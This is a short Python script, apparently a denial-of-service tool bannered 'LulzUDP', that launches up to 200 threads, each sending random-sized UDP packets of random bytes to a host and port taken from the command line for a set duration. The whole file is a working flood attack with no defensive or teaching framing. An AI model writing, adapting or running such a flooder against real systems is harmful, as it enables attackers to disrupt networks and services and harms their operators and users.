import socket, threading, sys, os, time
from random import randint

def flood():
    host = sys.argv[2]
    port = sys.argv[3]
    duration = sys.argv[4]

    stoptime = time.time() + int(duration)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind( ('0.0.0.0', randint(1,65535)))
    sock.settimeout(2)

    while time.time() < stoptime:
        try:
            sock.sendto(os.urandom(randint(1024, 2048)), (host, int(port)))
        except KeyboardInterrupt:
            os.kill(os.getpid(), 9)
        except Exception:
            pass
    
    sock.close()

if __name__ == '__main__':
    print('''
             /$$                 /$$           /$$   /$$ /$$$$$$$  /$$$$$$$ 
            | $$                | $$          | $$  | $$| $$__  $$| $$__  $$
            | $$       /$$   /$$| $$ /$$$$$$$$| $$  | $$| $$  \ $$| $$  \ $$
            | $$      | $$  | $$| $$|____ /$$/| $$  | $$| $$  | $$| $$$$$$$/
            | $$      | $$  | $$| $$   /$$$$/ | $$  | $$| $$  | $$| $$____/ 
            | $$      | $$  | $$| $$  /$$__/  | $$  | $$| $$  | $$| $$      
            | $$$$$$$$|  $$$$$$/| $$ /$$$$$$$$|  $$$$$$/| $$$$$$$/| $$      
            |________/ \______/ |__/|________/ \______/ |_______/ |__/      
    ''')
    
    try:
        threadcount = 200 if int(sys.argv[1]) > 200 else int(sys.argv[1])

        for _ in range(threadcount):
            threading.Thread(target=flood).start()
    except:
        print('error')